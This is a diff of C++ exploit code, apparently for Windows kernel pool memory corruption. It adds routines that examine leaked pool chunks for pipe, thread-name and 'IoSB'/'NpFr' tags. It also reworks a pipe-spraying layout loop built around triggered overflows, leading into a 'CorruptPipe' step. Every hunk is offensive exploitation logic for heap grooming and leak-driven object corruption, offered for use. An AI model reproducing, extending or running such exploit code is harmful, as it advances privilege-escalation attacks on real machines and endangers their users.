@@ -4,6 +4,79 @@
 #include "config.h"
 #include <algorithm>
 
+namespace
+{
+    bool ChunkIsAllZero(const BYTE* data, UINT64 size)
+    {
+        if (!data)
+            return false;
+
+        for (UINT64 i = 0; i < size; ++i)
+        {
+            if (data[i] != 0)
+                return false;
+        }
+
+        return true;
+    }
+
+    bool ChunkHasPipeObject(const BYTE* data, UINT64 size)
+    {
+        if (!data || size < 4)
+            return false;
+
+        for (UINT64 i = 0; i + 4 <= size; ++i)
+        {
+            if (memcmp(data + i, "PIPE", 4) == 0)
+                return true;
+        }
+
+        return false;
+    }
+
+    bool ChunkHasThreadNameObject(const BYTE* data, UINT64 size)
+    {
+        if (!data || size < 4)
+            return false;
+
+        for (UINT64 i = 0; i + 4 <= size; ++i)
+        {
+            if (memcmp(data + i, "ThNm", 4) == 0)
+                return true;
+        }
+
+        return false;
+    }
+
+    bool ChunkIsReusableSlot(const BYTE* data, UINT64 size)
+    {
+        return ChunkIsAllZero(data, size) ||
+            ChunkHasPipeObject(data, size) ||
+            ChunkHasThreadNameObject(data, size);
+    }
+
+    bool HasReusableSlotFrom(const BYTE* leak, UINT64 leakSize, UINT64 startSlot)
+    {
+        if (!leak || leakSize < CHUNKSIZE)
+            return false;
+
+        const UINT64 slotCount = leakSize / CHUNKSIZE;
+        for (UINT64 slot = startSlot; slot < slotCount; ++slot)
+        {
+            const BYTE* chunk = leak + (slot * CHUNKSIZE);
+            if (ChunkIsReusableSlot(chunk, CHUNKSIZE))
+                return true;
+        }
+
+        return false;
+    }
+
+    bool AllLeakSlotsFilledIgnoringPipes(const BYTE* leak, UINT64 leakSize)
+    {
+        return !HasReusableSlotFrom(leak, leakSize, 0);
+    }
+}
+
 
 std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
 {
@@ -20,7 +93,6 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
     }
 
     const UINT64 captureAttempts = 24;
-    const UINT64 iosbAttemptsPerCapture = 4;
     const UINT64 iosbLeaksPerAttempt = 8;
     const UINT64 pipeAttemptsPerIosb = 16;
     const UINT64 pipeLeaksPerAttempt = 4;
@@ -34,18 +106,24 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
             return std::nullopt;
         }
 
-        for (UINT64 iosbAttempt = 0; iosbAttempt < iosbAttemptsPerCapture; ++iosbAttempt)
+        bool needNewLeak = false;
+        UINT64 iosbAttempt = 0;
+
+        while (!needNewLeak)
         {
             DEBUG_PRINT(
-                " [*] IoSB attempt %llu/%llu for capture %llu\n",
+                " [*] IoSB attempt %llu for capture %llu\n",
                 (unsigned long long)(iosbAttempt + 1),
-                (unsigned long long)iosbAttemptsPerCapture,
                 (unsigned long long)(capture + 1)
             );
 
             InvokePrimeOverflow(CHUNKSIZE);
 
             bool iosbConfirmed = false;
+            UINT64 confirmedIosbOffset = 0;
+            UINT64 confirmedIosbSlot = 0;
+            bool leakSlotsFilledWithoutIosb = false;
+
             for (UINT64 iosbLeak = 0; iosbLeak < iosbLeaksPerAttempt; ++iosbLeak)
             {
                 BYTE* leakPtr = nameManagerLocked->LeakDataMalloc();
@@ -58,6 +136,10 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                 std::vector<UINT64> iosbOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "IoSB");
 
                 if (!iosbOffsets.empty()) {
+                    std::sort(iosbOffsets.begin(), iosbOffsets.end());
+                    confirmedIosbOffset = iosbOffsets.front();
+                    confirmedIosbSlot = confirmedIosbOffset / CHUNKSIZE;
+
                     DEBUG_PRINT(
                         " [*] Confirmed %zu IoSB candidates before pipe allocation on capture %llu IoSB attempt %llu leak %llu\n",
                         iosbOffsets.size(),
@@ -67,14 +149,22 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                     );
                     iosbConfirmed = true;
                 }
+                else if (AllLeakSlotsFilledIgnoringPipes(leakPtr, leakSize)) {
+					HexDumpLittleEndian(leakPtr, (size_t)leakSize);
+                    DEBUG_PRINT(" [*] Current leak has no IoSB and all non-pipe slots are filled; getting a new leak\n");
+                    leakSlotsFilledWithoutIosb = true;
+                }
 
                 free(leakPtr);
-                if (iosbConfirmed)
+                if (iosbConfirmed || leakSlotsFilledWithoutIosb)
                     break;
             }
 
             if (!iosbConfirmed) {
                 InvokePassOverflow();
+                needNewLeak = leakSlotsFilledWithoutIosb;
+                if (!needNewLeak)
+                    ++iosbAttempt;
                 continue;
             }
 
@@ -102,7 +192,15 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
 
                     if (iosbOffsets.empty() || npfrOffsets.empty())
                     {
+                        if (!HasReusableSlotFrom(leakPtr, leakSize, confirmedIosbSlot + 1)) {
+                            DEBUG_PRINT(" [*] All slots after confirmed IoSB are filled; getting a new leak\n");
+                            needNewLeak = true;
+                        }
+
                         free(leakPtr);
+                        if (needNewLeak)
+                            break;
+
                         continue;
                     }
 
@@ -169,14 +267,27 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                         }
                     }
 
+                    if (!HasReusableSlotFrom(leakPtr, leakSize, confirmedIosbSlot + 1)) {
+                        DEBUG_PRINT(" [*] All slots after confirmed IoSB are filled; getting a new leak\n");
+                        needNewLeak = true;
+                    }
+
                     free(leakPtr);
+                    if (needNewLeak)
+                        break;
                 }
 
                 pipeManagerLocked->ClearPipes();
+                if (needNewLeak)
+                    break;
+
                 Sleep(50);
             }
 
             InvokePassOverflow();
+            if (!needNewLeak)
+                ++iosbAttempt;
+
             Sleep(50);
         }
 
@@ -210,9 +321,9 @@ bool MemoryBroker::CorruptPipe()
 
 
 
+	HexDumpLittleEndian(layout.leakedData.data(), (size_t)layout.leakedData.size());
 
-
-
+    return true;
 
 
 
